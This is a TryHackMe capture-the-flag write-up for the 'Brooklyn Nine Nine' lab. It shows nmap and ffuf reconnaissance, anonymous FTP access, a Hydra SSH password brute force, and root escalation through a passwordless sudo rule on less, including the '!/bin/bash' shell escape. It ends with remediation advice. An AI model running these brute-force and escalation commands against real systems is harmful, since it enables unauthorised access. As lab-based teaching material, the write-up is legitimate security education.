<div align="center">

<img src="https://assets.tryhackme.com/img/THMlogo.png" alt="TryHackMe Logo" width="180"/>

<br/><br/>

<!-- Animated Hacking GIF -->
<img src="https://media.giphy.com/media/RbDKaczqWovIugyJmW/giphy.gif" width="280" alt="Hacking Terminal Animation"/>

<br/><br/>

# 🕵️ Brooklyn Nine Nine — TryHackMe Writeup

### *Enumeration · Brute Force · Privilege Escalation*

<br/>

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge&logo=shield&logoColor=white)](https://tryhackme.com)
[![Category](https://img.shields.io/badge/Category-Linux%20%2F%20CTF-blue?style=for-the-badge&logo=linux&logoColor=white)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Completed%20%E2%9C%94-success?style=for-the-badge)](https://tryhackme.com)

</div>

---

## 📋 Table of Contents

| # | Section |
|:---:|:---|
| 1 | [🌐 Initial Reconnaissance — Web & Fuzzing](#-initial-reconnaissance--web--fuzzing) |
| 2 | [🔭 Port Scanning with Nmap](#-port-scanning-with-nmap) |
| 3 | [📂 FTP Enumeration & Anonymous Login](#-ftp-enumeration--anonymous-login) |
| 4 | [🔑 SSH Brute Force with Hydra](#-ssh-brute-force-with-hydra) |
| 5 | [🏠 Post-Login Enumeration](#-post-login-enumeration) |
| 6 | [⬆️ Privilege Escalation via `less`](#%EF%B8%8F-privilege-escalation-via-less) |
| 7 | [🏁 Flags](#-flags) |
| 8 | [📝 Key Takeaways](#-key-takeaways) |

---

## 🌐 Initial Reconnaissance — Web & Fuzzing

After deploying the machine and obtaining the target IP, the first step was to visit the web page running on port 80.

![homepage](homepage.png)

The page loaded successfully, but there wasn't much visible on the surface. I ran directory fuzzing against the target to discover any hidden endpoints:

```bash
ffuf -u http://10.49.129.48/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Unfortunately, the fuzzing didn't return anything of note. No hidden directories or files were discovered at the web level, so I shifted focus to a broader port scan.

---

## 🔭 Port Scanning with Nmap

<div align="center">
<img src="https://media.giphy.com/media/077i6AULCXc0FKTj9s/giphy.gif" width="160" alt="Scanning Animation"/>
</div>

Running a full Nmap service and version scan against the target revealed three open ports:

```
Nmap scan report for 10.49.129.48
Host is up (0.065s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.246.164
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=4/29%OT=21%CT=1%CU=42302%PV=Y%DS=3%DC=T%G=Y%TM=69F1BB2
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%G
OS:CD=1%ISR=109%TI=Z%CI=Z%II=I%TS=9)OPS(O1=M4E8ST11NW6%O2=M4E8ST11NW6%O3=M4
OS:E8NNT11NW6%O4=M4E8ST11NW6%O5=M4E8ST11NW6%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW6%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports summary:**

| Port | Service | Version | Notes |
|:---:|:---|:---|:---|
| 21 | FTP | vsftpd 3.0.3 | ⚠️ Anonymous login **allowed** — file present |
| 22 | SSH | OpenSSH 7.6p1 | Potential brute-force vector |
| 80 | HTTP | Apache 2.4.29 | Static web page — nothing actionable |

The most interesting finding right away was **anonymous FTP login** being enabled with a file called `note_to_jake.txt` already visible in the listing. That's a significant misconfiguration — anonymous FTP access should almost never be permitted in a production environment.

---

## 📂 FTP Enumeration & Anonymous Login

<div align="center">
<img src="https://media.giphy.com/media/3oKIPnAiaMCws8nOsE/giphy.gif" width="200" alt="File Transfer Animation"/>
</div>

I connected to the FTP server using the anonymous credentials (no password required):

```bash
ftp 10.49.129.48
# Username: anonymous
# Password: (blank / press Enter)
```

Once connected, I retrieved the note file:

```bash
get note_to_jake.txt
```

After downloading it, I read the contents:

```bash
cat note_to_jake.txt
```

```
From Amy,

Jake please change your password. It is too weak and Holt will be mad if someone hacks into the Nine-Nine.
```

> 💡 **Key insight:** This note immediately tells us three things:
> - There are at least three user accounts: **Amy**, **Jake**, and **Holt**
> - Jake's password is described as weak — a classic hint to attempt brute-forcing
> - The note implies these are valid system users, which means SSH brute force is worth trying

---

## 🔑 SSH Brute Force with Hydra

<div align="center">
<img src="https://media.giphy.com/media/l3vRfhFD8hJCiP0uQ/giphy.gif" width="220" alt="Brute Force Animation"/>
</div>

With three potential usernames confirmed, the next step was to attempt a password brute force. I first tried brute-forcing Jake's FTP login, but that didn't yield results. Switching the target to the SSH service proved far more effective.

```bash
hydra -l jake -P /home/Seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ssh://10.49.129.48
```

> 🔒 **Why SSH over FTP?** Even though the FTP anonymous login worked, gaining an interactive shell via SSH gives a much more stable foothold on the target. SSH is always the preferred entry point when available.

Hydra ran through the wordlist and successfully returned Jake's password. With those credentials in hand, I logged in:

```bash
ssh jake@10.49.129.48
```

---

## 🏠 Post-Login Enumeration

<div align="center">
<img src="https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif" width="200" alt="Exploration Animation"/>
</div>

After gaining a shell as Jake, I began enumerating the system to understand what was available and what could be leveraged for privilege escalation.

### 📁 Home Directory Structure

```bash
ls /home
# amy  holt  jake
```

As expected, all three users had home directories. I checked Holt's directory first, since the note had specifically mentioned him and it seemed likely that the user flag would be there.

```bash
ls /home/holt
# user.txt  nano.save
```

The `user.txt` file was readable without any issues — the user flag was captured. The `nano.save` file, however, was not accessible with Jake's current permissions.

### 🔍 Checking Sudo Privileges

```bash
sudo -l
```

```bash
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

> 🚨 **Critical finding:** Jake can run `/usr/bin/less` as **root** without a password. This is a well-known privilege escalation vector — `less` can be abused via [GTFOBins](https://gtfobins.github.io/gtfobins/less/) to either read arbitrary files or drop a root shell.

---

## ⬆️ Privilege Escalation via `less`

<div align="center">
<img src="https://media.giphy.com/media/WoWm8YzFQJg28/giphy.gif" width="200" alt="Privilege Escalation Animation"/>
</div>

Since `less` runs as root under this sudo rule, and the root flag is located at `/root/root.txt` (only accessible by the root user), the privilege escalation here is straightforward.

```bash
sudo /usr/bin/less /root/root.txt
```

Because `less` executes with root privileges under this sudo entry, it can read any file on the system — including the root flag. The flag was displayed directly in the `less` pager.

> 💡 **Bonus:** `less` can also be used to spawn a root shell directly. Once inside the pager, typing `!bash` or `!/bin/bash` will drop you into a root shell — a useful technique to remember.
>
> ```
> sudo less /etc/passwd
> # Then inside the pager, type:
> !/bin/bash
> ```
> This gives a fully interactive root shell, which is even more powerful than simply reading a file.

---

## 🏁 Flags

<div align="center">
<img src="https://media.giphy.com/media/pMHf0JkqMHFWBfTrPl/giphy.gif" width="180" alt="Flag Captured"/>
</div>

| 🏷️ Flag | 📍 Location | 🔑 Method |
|:---|:---|:---|
| 🚩 **User Flag** | `/home/holt/user.txt` | Read as Jake (world-readable file in Holt's home) |
| 🏆 **Root Flag** | `/root/root.txt` | `sudo /usr/bin/less /root/root.txt` — GTFOBins abuse |

---

## 📝 Key Takeaways

<div align="center">

> *"The quieter you become, the more you are able to hear."* — Ram Dass

</div>

This room is a solid demonstration of how misconfigurations chain together to produce a full system compromise. None of the individual vulnerabilities here required advanced exploitation — the danger lay entirely in poor configuration choices:

| ⚠️ Misconfiguration | 💥 Impact | ✅ Remediation |
|:---|:---|:---|
| **Anonymous FTP enabled** | Leaked internal note with valid usernames | Disable anonymous FTP; require authenticated access |
| **Weak user password** | Full SSH access via brute force in seconds | Enforce strong password policies; use SSH key authentication |
| **Overly permissive sudo rule** | Unrestricted root file read (and shell escape) | Avoid granting sudo to pagers/editors; use fine-grained policies |

> 🔐 **Rule of thumb:** Any binary listed on [GTFOBins](https://gtfobins.github.io/) that can be run with sudo should be treated as a direct root escalation vector unless properly sandboxed.

---

<div align="center">

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Brooklyn%20Nine%20Nine-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![GTFOBins](https://img.shields.io/badge/Reference-GTFOBins-orange?style=for-the-badge)](https://gtfobins.github.io/gtfobins/less/)

<br/>

<img src="https://media.giphy.com/media/077i6AULCXc0FKTj9s/giphy.gif" width="80" alt="Done"/>

*Writeup by [LinuxX](https://tryhackme.com/p/LinuxX) — Happy Hacking! 🖥️🔐*

</div>
